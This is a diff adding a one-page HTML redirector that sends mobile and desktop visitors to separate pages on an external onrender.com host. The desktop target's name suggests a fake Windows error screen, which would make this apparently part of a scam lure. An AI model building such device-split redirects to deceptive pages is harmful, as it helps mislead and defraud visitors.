@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <script>
+    function isMobileDevice() {
+      return /Android|iPhone|iPad|iPod|webOS|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    }
+
+    document.addEventListener("DOMContentLoaded", function () {
+      if (isMobileDevice()) {
+        // 📱 Redirect to mobile-specific page
+        window.location.href = "https://multi-i1iu.onrender.com/android-ios.html";
+      } else {
+        // 💻 Redirect to desktop-specific page
+        window.location.href = "https://multi-i1iu.onrender.com/winerror-one-arrow.html";
+      }
+    });
+  </script>
+</head>
+<body>
+  <p>Redirecting...</p>
+</body>
+</html>
